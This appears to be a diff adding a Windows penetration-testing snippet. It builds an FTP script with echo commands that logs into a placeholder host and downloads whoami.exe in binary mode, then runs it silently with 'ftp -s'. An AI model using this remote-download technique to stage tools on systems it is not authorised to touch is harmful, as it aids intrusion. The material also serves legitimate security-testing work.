@@ -1,0 +1,11 @@
+#windows command
+#make sure between the USERNAME/PASSWORD and the ">>" not space.Otherwise it will login with "USERNAME " and "PASSWORD ",it may cause login failed
+
+echo open IP> ftp.txt
+echo USERNAME>> ftp.txt
+echo PASSWORD>> ftp.txt
+echo binary>> ftp.txt
+echo get whoami.exe>> ftp.txt
+echo bye>> ftp.txt
+
+ftp -v -s:ftp.txt
